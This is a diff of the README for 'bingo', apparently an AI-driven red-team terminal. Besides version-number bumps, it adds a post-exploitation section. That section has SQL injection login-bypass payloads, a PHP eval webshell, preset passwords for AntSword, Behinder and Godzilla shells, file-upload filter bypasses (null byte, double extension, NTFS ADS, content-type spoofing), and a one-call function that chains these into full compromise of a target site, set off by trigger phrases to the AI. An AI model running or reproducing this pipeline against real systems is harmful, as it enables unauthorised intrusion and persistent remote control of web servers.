@@ -6,7 +6,7 @@
 
 **AI-Powered Red Team Terminal**
 
-[![Version](https://img.shields.io/badge/version-2.2.4-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-2.2.5-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
 [![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
@@ -15,7 +15,7 @@
 *DeepSeek · Claude · GPT · GLM · Qwen · Ollama · Custom*
 
 > **v2.1.0 — Official Release**  
-> Previous versions (≤ 2.0.x) were test/beta releases. v2.2.4 is the latest stable, production-ready version.
+> Previous versions (≤ 2.0.x) were test/beta releases. v2.2.5 is the latest stable, production-ready version.
 
 </div>
 
@@ -1472,7 +1472,7 @@ Based on real-world exploitation experience:
 
 When password hashes appear in AI responses, bingo automatically triggers a crack pipeline.
 
-**Context-Aware Hash Filter (new in v2.2.3 → v2.2.4)**
+**Context-Aware Hash Filter (new in v2.2.3 → v2.2.5)**
 
 Not every 32-character hex string is a password hash. HTTP error pages, tracking IDs, transaction codes, and other identifiers share the same hexadecimal pattern as MD5/NTLM hashes. bingo now automatically detects and skips these false positives before wasting time on crack attempts.
 
@@ -3236,6 +3236,161 @@ bash install.sh
 ```
 
 Pull requests are welcome. Please open an issue first for major changes.
+
+---
+
+## Post-Exploitation — SQLi Admin Bypass + Webshell Deploy (v2.2.5)
+
+Real-world post-exploitation pipeline learned from live engagements:
+**SQL injection login bypass → file upload → webshell deployment → AntSword connection**.
+
+### SQLi Admin Login Bypass
+
+Comment-based SQL injection bypasses password verification on the server side without knowing the password hash.
+
+```python
+from bingo.tools.post_exploit import sqli_login_bypass
+
+result = sqli_login_bypass(
+    login_url = "https://target.com/adm/auth/login/check",
+    id_field  = "user_id",
+    pw_field  = "user_pw",
+)
+if result["success"]:
+    print(f"✅ Login bypassed! Payload: {result['payload']}")
+    print(f"   Redirect : {result['redirect_url']}")
+    print(f"   Cookie   : {result['cookie']}")
+```
+
+**Built-in payloads (auto-iterated):**
+
+| Payload | Technique |
+|---------|-----------|
+| `admin'-- -` | Comment bypass — most common |
+| `admin'#` | MySQL hash-comment bypass |
+| `' OR '1'='1'-- -` | Boolean always-true |
+| `admin' OR 1=1-- -` | Numeric always-true |
+| `admin'/**/OR/**/'1'='1'#` | Space-bypass variant |
+
+**Vulnerable SQL pattern (server-side):**
+```sql
+SELECT * FROM tbl_admin WHERE user_id='admin'-- -' AND user_pw=MD5(?)
+--  ↑ everything after -- is commented out → password check skipped
+```
+
+---
+
+### Webshell Upload + AntSword Connection
+
+After gaining admin access, bingo tests file upload endpoints for webshell deployment.
+
+**Supported combinations:**
+
+| Key | Language | Tool | Password |
+|-----|----------|------|----------|
+| `php_antsword` | PHP | AntSword | `ant` |
+| `php_antsword_b64` | PHP | AntSword (base64) | `ant` |
+| `php_behinder` | PHP | Behinder v3 | `rebeyond` |
+| `php_godzilla` | PHP | Godzilla | `pass` |
+| `php_simple` | PHP | curl/browser | `cmd` |
+| `jsp_antsword` | JSP | AntSword | `ant` |
+| `aspx_antsword` | ASPX | AntSword | `ant` |
+
+```python
+from bingo.tools.post_exploit import get_webshell, upload_webshell, verify_webshell
+
+# 1. Select payload
+shell = get_webshell("php", "antsword")
+# → <?php @eval($_POST["ant"]);?>
+
+# 2. Upload (requires login session opener)
+result = upload_webshell(
+    opener      = opener,       # from sqli_login_bypass()
+    upload_url  = "https://target.com/adm/upload",
+    shell_payload = shell,
+    bypass_ext  = ".phtml",     # extension bypass
+    bypass_ct   = "image/jpeg", # Content-Type spoof
+)
+
+# 3. Verify execution
+if result["uploaded_url"]:
+    v = verify_webshell(opener, result["uploaded_url"], "ant")
+    print("✅ Shell alive!" if v["alive"] else "✗ No response")
+```
+
+**Upload bypass strategies (auto-iterated in order):**
+
+| Priority | Technique | Example |
+|----------|-----------|---------|
+| 1 | Extension variant | `.phtml`, `.php5`, `.php3` |
+| 2 | Content-Type spoof + magic bytes | `image/jpeg` + `\xff\xd8\xff` prefix |
+| 3 | Double extension | `shell.php.jpg` |
+| 4 | Null byte | `shell.php%00.jpg` (legacy PHP) |
+| 5 | NTFS ADS | `shell.php::$DATA` (Windows IIS) |
+
+---
+
+### AntSword Config Auto-Generation
+
+```python
+from bingo.tools.post_exploit import generate_antsword_config, print_antsword_guide
+import json
+
+cfg = generate_antsword_config(
+    shell_url  = "https://target.com/uploads/shell.php",
+    password   = "ant",
+    shell_type = "PHP",
+)
+with open("antsword_config.json", "w") as f:
+    json.dump(cfg, f, indent=2)
+
+# Import: AntSword → Data Manager → Import → antsword_config.json
+print(print_antsword_guide("https://target.com/uploads/shell.php", "ant"))
+```
+
+**Manual AntSword connection:**
+1. Open AntSword → right-click empty area → **Add Data**
+2. URL: `https://target.com/uploads/shell.php`
+3. Password: `ant`
+4. Request Type: `POST`
+5. Shell Type: `PHP`
+6. Click **Test Connection** → green light ✅
+
+---
+
+### Full Pipeline Automation
+
+One-call automation: SQLi bypass → upload → verify → AntSword config:
+
+```python
+from bingo.tools.post_exploit import auto_post_exploit
+import json
+
+result = auto_post_exploit(
+    base_url   = "https://target.com",
+    login_url  = "https://target.com/adm/auth/login/check",
+    upload_url = "https://target.com/adm/upload",
+    id_field   = "user_id",
+    pw_field   = "user_pw",
+    lang       = "php",
+    tool       = "antsword",
+)
+
+if result.get("success"):
+    print("✅ Webshell confirmed!")
+    print(result["antsword_guide"])
+    with open("antsword_config.json", "w") as f:
+        json.dump(result["antsword"], f, indent=2)
+```
+
+**bingo AI auto-selection trigger phrases:**
+
+| Input | Skill Selected |
+|-------|---------------|
+| `웹쉘 배포`, `webshell`, `shell upload` | `webshell-upload` |
+| `로그인 우회`, `admin bypass`, `sqli login` | `sqli-admin-bypass` |
+| `antsword`, `AntSword 연결`, `ant 설정` | `antsword-config` |
+| `전체 침투`, `full chain`, `post exploit` | `post-exploit-pipeline` |
 
 ---
 
